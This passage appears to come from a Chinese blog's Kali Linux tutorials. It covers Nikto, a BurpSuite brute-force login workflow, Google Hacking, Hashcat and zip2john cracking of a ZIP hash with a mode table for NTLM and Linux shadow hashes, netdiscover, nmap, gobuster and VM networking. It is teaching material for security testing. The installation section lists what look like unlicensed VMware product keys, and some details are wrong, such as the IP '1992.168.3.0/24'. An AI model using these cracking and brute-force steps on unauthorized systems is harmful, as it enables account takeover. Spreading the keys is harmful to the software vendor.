","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:3:4","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":"总结 Nikto 是一款功能强大的 web 服务器扫描工具，通过其丰富的漏洞库和简单的命令行界面，可以有效地检测 web 服务器的安全问题。本文详细介绍了 Nikto 的安装、基本使用和高级扫描选项，帮助用户快速掌握该工具的使用方法。 在实际操作中，请务必遵守相关法律法规，仅在合法授权的情况下使用该工具。通过使用 Nikto，安全研究人员和系统管理员可以更加全面地了解 web 服务器的安全状况，及时发现并修复潜在的安全漏洞，提高系统的整体安全性。 ","date":"2025-05-27","objectID":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/:4:0","tags":["kali"],"title":"Nikto-服务器安全漏洞扫描","uri":"/posts/nikto-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"},{"categories":["网络安全"],"content":" 遇到只需要账号和密码的地方，我们要用到破解技术，什么是破解技术呢?其实就是一个一个的去尝试不同的密码看看能不能登录进去 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/:0:0","tags":["kali"],"title":"网站系统账户破解-BurpSuite","uri":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/"},{"categories":["网络安全"],"content":"Google Hacking Google Hacking(谷歌黑客)是一种利用Google搜索引擎来查找可能存在安全漏洞或敏感信息的技术。黑客或安全研究人员通过使用特定的Google搜索命令和关键字，找到网站中意外暴露的文件、登录页面、数据库信息、配置文件等，可能导致安全漏洞的存在，当然百度也可以。 所有政府网站不要搞 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/:1:0","tags":["kali"],"title":"网站系统账户破解-BurpSuite","uri":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/"},{"categories":["网络安全"],"content":"BurpSuite Burp Suite 是一款常用于网络安全和渗透测试的综合性工具，它主要帮助安全研究人员、渗透测试人员和开发人员分析和测试 Web 应用程序的安全性。可以找漏洞、暴力破解、扫描等 拦截代理(Proxy): 可以拦截、修改、重放客户端和服务器之间的 HTTP/S 流量，用于测试和调试请求 扫描器(Scanner):自动化的漏洞扫描工具，如 SQL注入、跨站脚本攻击(XSS)等。 爬虫(Crawler): 帮助自动发现和映射 Web 应用中的各个页面和功能，便于分析。 Intruder:用于执行自定义的渗透测试攻击，比如暴力破解、参数篡改等 Repeater:允许用户反复发送和修改 HTTP 请求，观察服务器响应，用于手动测试漏洞。 Comparer:对比两次响应的不同，帮助分析漏洞利用的效果。 Sequencer:用于测试随机数或会话令牌的随机性和安全性 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/:2:0","tags":["kali"],"title":"网站系统账户破解-BurpSuite","uri":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/"},{"categories":["网络安全"],"content":"字典 暴力破解中的字典，通常指的是一个包含大量预定义单词、密码或短语的列表，用于尝试登录或破解密码的过程。这种攻击方式称为字典攻击(DictionaryAttack)，“它通过使用字典中的每一个条目作为密码，逐一进行尝试，直到找到正确的密码为止。 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/:2:1","tags":["kali"],"title":"网站系统账户破解-BurpSuite","uri":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/"},{"categories":["网络安全"],"content":"暴力破解流程 打开代理浏览器获得请求 proxy - \u003e Intercept -\u003e open brower 通过内置浏览器打开目标网站，模拟一个正常登录 拦截的请求（确保拦截开启） 标记 发送到Intruder 选中标记，增加Payload 暴力破解 选择字典 通过response的长度找到不同的请求响应找到正确的密码（不一定成功） ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/:2:2","tags":["kali"],"title":"网站系统账户破解-BurpSuite","uri":"/posts/%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E8%B4%A6%E6%88%B7%E7%A0%B4%E8%A7%A3-burpsuite/"},{"categories":["网络安全"],"content":"Hashcat Hashcat 是一款强大的密码破解工具，但它不支持直接破解 ZIP 文件密码。Hashcat 主要用于破解哈希值，而 ZIP 文件通常使用的是加密而不是哈希，它们使用的是不同的加密技术。 在kali中使用的要求必须是内存大于4G，否则没用Hashcat具体的用法如下: Hashcat.exe -m 解码编码 hash值 字典 hashcat --help hashcat (v6.2.6) starting in help mode Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]... - [ Options ] - Options Short / Long | Type | Description | Example ================================+======+======================================================+======================= -m, --hash-type | Num | Hash-type, references below (otherwise autodetect) | -m 1000 -a, --attack-mode | Num | Attack-mode, see references below | -a 3 -V, --version | | Print version | -h, --help | | Print help | --quiet | | Suppress output | --hex-charset | | Assume charset is given in hex | --hex-salt | | Assume salt is given in hex | --hex-wordlist | | Assume words in wordlist are given in hex | --force | | Ignore warnings | --deprecated-check-disable | | Enable deprecated plugins | --status | | Enable automatic update of the status screen | --status-json | | Enable JSON format for status output | --status-timer | Num | Sets seconds between status screen updates to X | --status-timer=1 --stdin-timeout-abort | Num | Abort if there is no input from stdin for X seconds | --stdin-timeout-abort=300 --machine-readable | | Display the status view in a machine-readable format | --keep-guessing | | Keep guessing the hash after it has been cracked | --self-test-disable | | Disable self-test functionality on startup | --loopback | | Add new plains to induct directory | --markov-hcstat2 | File | Specify hcstat2 file to use | --markov-hcstat2=my.hcstat2 --markov-disable | | Disables markov-chains, emulates classic brute-force | --markov-classic | | Enables classic markov-chains, no per-position | --markov-inverse | | Enables inverse markov-chains, no per-position | -t, --markov-threshold | Num | Threshold X when to stop accepting new markov-chains | -t 50 --runtime | Num | Abort session","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:1:0","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"破解ZIP密码 ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:2:0","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"新建加密zip ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:2:1","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"破解 Hashcat.exe -m 解码编码 hash值 字典 解码编码：就是–help对应的破解编号 hash值：通过john算出来的， 以当前文件为例： zip2john 加密测试.zip ver 2.0 efh 7075 加密测试.zip/���Լ���.txt PKZIP Encr: TS_chk, cmplen=27, decmplen=12, crc=D1EE6067 ts=74EC cs=74ec type=8 加密测试.zip/���Լ���.txt:$pkzip$1*1*2*0*1b*c*d1ee6067*0*43*8*1b*74ec*e099cab173c51e8ee7d55f776209fb8de2cdf1492001837c43eb43*$/pkzip$:���Լ���.txt:加密测试.zip::加密测试.zip 这部分就是Hash值 $pkzip$1*1*2*0*1b*c*d1ee6067*0*43*8*1b*74ec*e099cab173c51e8ee7d55f776209fb8de2cdf1492001837c43eb43*$/pkzip$ 密码字典 hashcat -m 17220 hash123.txt /usr/share/wordlists/rockyou.txt --show hash123.txt 是hash值存储的文件， –show 展示密码 ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:2:2","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"不是所有hash都能破解，取决于加密参数，密码字典大小，算力 ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:2:3","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"如何根据hash值判断hash类型 ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:3:0","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"哈希类型识别核心步骤 1、自动识别工具‌ 运行命令查看Hashcat内置支持的哈希类型及对应编号： hashcat --example-hashes | less # 浏览所有哈希示例及对应-m参数值:ml-citation{ref=\"4,7\" data=\"citationList\"} 通过在线工具（如hash-identifier）快速识别哈希类型 2‌、手动特征比对‌ 哈希长度与结构‌： MD5: 32位十六进制字符（如5f4dcc3b5aa765d61d8327deb882cf99） → -m 0 SHA-256: 64位十六进制字符 → -m 1400 NTLM: 32位大小写混合字符（如e45a314c664d40a227f95401...） → -m 1000 WPA/WPA2: 256位二进制数据（握手包提取） → -m 22000 ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:3:1","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"常见场景参数对照表 ‌哈希来源 ‌Hashcat参数(-m) ‌典型特征 ‌示例命令 Windows本地账户(NTLM) 1000 32位十六进制字符串 hashcat -m 1000 hash.txt rockyou.txt Office文档(DOC加密) 9800 包含特定格式前缀的哈希 hashcat -m 9800 doc_hash.txt ?d?d?d?d ZIP压缩文件 13600 通过zip2john提取的哈希 hashcat -m 13600 zip_hash.txt -a 3 ?l?l?l?l Linux Shadow密码(SHA512) 1800 以$6$开头的哈希值 hashcat -m 1800 shadow_hash.txt dict.txt ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:3:2","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"关键操作技巧 ‌动态参数验证 通过hashcat -h | grep -i \u003c关键词\u003e过滤特定哈希类型： hashcat -h | grep -i \"office\" # 查找Office相关哈希类型编号 复合攻击模式 掩码攻击（已知密码结构） → -a 3 + 掩码规则（如?d?d?l?l表示2数字+2小写字母） 混合字典攻击 → -a 6（字典+掩码）或-a 7（掩码+字典） ","date":"2025-05-24","objectID":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/:3:3","tags":["kali"],"title":"kali实现密码破解PDF-ZIP文件","uri":"/posts/kali%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3pdf-zip%E6%96%87%E4%BB%B6/"},{"categories":["网络安全"],"content":"Netdiscover Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地,这种扫描的方式在内网中不容易被别人发现。用于内网主机扫描。 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:1:0","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"基础常识 IP地址(Internet ProtocolAddress)是指互联网协议地址，又译为网际协议地址IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:1:1","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"使用 Netdiscover 0.10 [Active/passive ARP reconnaissance tool] Written by: Jaime Penalba \u003cjpenalbae@gmail.com\u003e Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-F filter] [-s time] [-c count] [-n node] [-dfPLNS] -i device: your network device -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8 -l file: scan the list of ranges contained into the given file -p passive mode: do not send anything, only sniff -m file: scan a list of known MACs and host names -F filter: customize pcap filter expression (default: \"arp\") -s time: time to sleep between each ARP request (milliseconds) -c count: number of times to send each ARP request (for nets with packet loss) -n node: last source IP octet used for scanning (from 2 to 253) -d ignore home config files for autoscan and fast mode -f enable fastmode scan, saves a lot of time, recommended for auto -P print results in a format suitable for parsing by another program and stop after active scan -L similar to -P but continue listening after the active scan is completed -N Do not print header. Only valid when -P or -L is enabled. -S enable sleep time suppression between each request (hardcore mode) If -r, -l or -p are not enabled, netdiscover will scan for common LAN addresses. 1、扫描网段192.168.3.XX的主机 sudo netdiscover -r 1992.168.3.0/24 一定要在同一个网段，不同网段是扫描不到的，需要路由器防火墙特殊配置 比如本机ip是192.168.81.128， 有一台主机ip是192.168.2.5，两台主机属于不同网段，扫描不到 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:1:2","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"NMAP 在Kali中可以使用NMAP工具进行扫描，可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:2:0","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"使用 Nmap 7.95 ( https://nmap.org ) Usage: nmap [Scan Type(s)] [Options] {target specification} TARGET SPECIFICATION: Can pass hostnames, IP addresses, networks, etc. Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL \u003cinputfilename\u003e: Input from list of hosts/networks -iR \u003cnum hosts\u003e: Choose random targets --exclude \u003chost1[,host2][,host3],...\u003e: Exclude hosts/networks --excludefile \u003cexclude_file\u003e: Exclude list from file HOST DISCOVERY: -sL: List Scan - simply list targets to scan -sn: Ping Scan - disable port scan -Pn: Treat all hosts as online -- skip host discovery -PS/PA/PU/PY[portlist]: TCP SYN, TCP ACK, UDP or SCTP discovery to given ports -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes -PO[protocol list]: IP Protocol Ping -n/-R: Never do DNS resolution/Always resolve [default: sometimes] --dns-servers \u003cserv1[,serv2],...\u003e: Specify custom DNS servers --system-dns: Use OS's DNS resolver --traceroute: Trace hop path to each host SCAN TECHNIQUES: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans --scanflags \u003cflags\u003e: Customize TCP scan flags -sI \u003czombie host[:probeport]\u003e: Idle scan -sY/sZ: SCTP INIT/COOKIE-ECHO scans -sO: IP protocol scan -b \u003cFTP relay host\u003e: FTP bounce scan PORT SPECIFICATION AND SCAN ORDER: -p \u003cport ranges\u003e: Only scan specified ports Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 --exclude-ports \u003cport ranges\u003e: Exclude the specified ports from scanning -F: Fast mode - Scan fewer ports than the default scan -r: Scan ports sequentially - don't randomize --top-ports \u003cnumber\u003e: Scan \u003cnumber\u003e most common ports --port-ratio \u003cratio\u003e: Scan ports more common than \u003cratio\u003e SERVICE/VERSION DETECTION: -sV: Probe open ports to determine service/version info --version-intensity \u003clevel\u003e: Set from 0 (light) to 9 (try all probes) --version-light: Limit to most likely probes (intensity 2) --version-all: Try every single probe (intensity 9) --version-t","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:2:1","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"扫描服务器路由 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:3:0","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"使用Nmap进行路径探测‌ 通过http-enum脚本扫描常见Web路径： nmap -p 80,443 --script http-enum \u003c目标IP\u003e 该脚本会自动检测/admin、/login等常见管理接口 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:3:1","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"专用Web路径扫描工具‌ DirBuster：图形化工具，内置字典可暴力破解路径 Gobuster：命令行工具，支持多线程扫描 gobuster dir -u http://\u003c目标IP\u003e -w /path/to/wordlist.txt ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:3:2","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"Burp Suite专业扫描 使用爬虫功能自动发现路径：在Target站点地图中，右键目标选择“Spider this host”，Burp会递归爬取链接，发现隐藏路径（如/admin或/backup） 使用扫描器（Scanner）主动探测路径‌（需专业版支持）： 右键启动“Active Scan”，Burp会发送请求探测常见路径（如/login），并基于响应状态码（200/403/404）判断路径是否存在 自定义扫描配置：在“Scanner”选项卡设置扫描范围，包括添加自定义路径字典（如/admin、/api）以提高针对性 结合Intruder模块进行定制化爆破 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:3:3","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"VM网络模式 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:4:0","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"模式对比‌ ‌NAT模式‌：虚拟机通过主机转换IP上网，默认创建独立子网（如192.168.81.0） ‌桥接模式‌：虚拟机直接使用物理网络适配器，与主机共享同一网段（如192.168.2.0） ‌仅主机模式‌：完全隔离网络环境，仅支持虚拟机和主机通信 ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:4:1","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"配置同一网段方案 方案1：桥接模式直连（推荐） 虚拟机设置： 右键虚拟机 → 设置 → 网络适配器 → 选择「桥接模式」 勾选「复制物理网络连接状态」（自动同步主机网卡） 主机操作： # Linux虚拟机静态IP配置示例（需root权限） nmcli con modify ens33 ipv4.addresses 192.168.2.128/24 nmcli con modify ens33 ipv4.gateway 192.168.2.1 nmcli con up ens33 方案2：NAT模式定制网段 修改VMware虚拟网络配置： 打开「虚拟网络编辑器」→ 选择「VMnet8（NAT模式）」 设置子网IP为192.168.2.0 → 子网掩码255.255.255.0 修改NAT设置中的网关为192.168.2.1 主机虚拟网卡调整： 打开「网络连接」→ 右键「VMnet8」→ 属性 → IPv4协议 设置IP地址为192.168.2.1（需与虚拟机网关一致） 方案3：静态路由互通（企业级方案） 若存在三层交换机或路由器： 在设备上添加静态路由： 目标网段：192.168.81.0/24 → 下一跳：主机所在网关（如192.168.2.1） 目标网段：192.168.2.0/24 → 下一跳：虚拟机所在网关（如192.168.81.1） ","date":"2025-05-24","objectID":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/:4:2","tags":["kali"],"title":"网络主机探测与识别-Netdiscover \u0026 nmap","uri":"/posts/%E7%BD%91%E7%BB%9C%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B%E4%B8%8E%E8%AF%86%E5%88%AB-netdiscover-nmap/"},{"categories":["网络安全"],"content":"Kali简介 kali官网 Kali是一个Linux操作系统，系统中包含了很多实用渗透和审计工具，大多数做安全测试的开源工具都被囊括在内。 ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:1:0","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"安装平台 ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:1:1","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"镜像下载 在Windows安装虚拟机并在虚拟机安装kali Kali inside VMware (Guest VM) | Kali Linux Documentation ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:1:2","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"工具文档 Kali Tools | Kali Linux Tools ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:1:3","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"官方论坛 Kali Linux Forum ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:1:4","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"VMware Workstation VMware Workstation简称VM，是一款功能强大的桌面虚拟计算机软件，提供用户可在单一的桌面上同时运行不同的操作系统，和进行开发、测试、部署新的应用程序的最佳解决方案. https://www.vmware.com/ ‌Workstation Pro‌：需购买商业许可证，适用于企业开发、测试及多系统部署场景. VMware Workstation (Player)： 个人用户可免费使用非商业版本，适合学习或简单应用场景. ZF3R0-FHED2-M80TY-8QYGC-NPKYF YF390-0HF8P-M81RQ-2DXQE-M2UT6 ZF71R-DMX85-08DQY-8YMNC-PPHV8 ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:2:0","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"安装kali 打开官网已经配置好的虚拟机文件:xxxxxx.vmx ","date":"2025-05-23","objectID":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/:2:1","tags":["kali"],"title":"Kali简介与安装","uri":"/posts/kali%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%AE%89%E8%A3%85/"},{"categories":["网络安全"],"content":"汉化 1、打开终端输入命令： sudo dpkg-reconfigure locales 2、在弹出的对话框选择中文 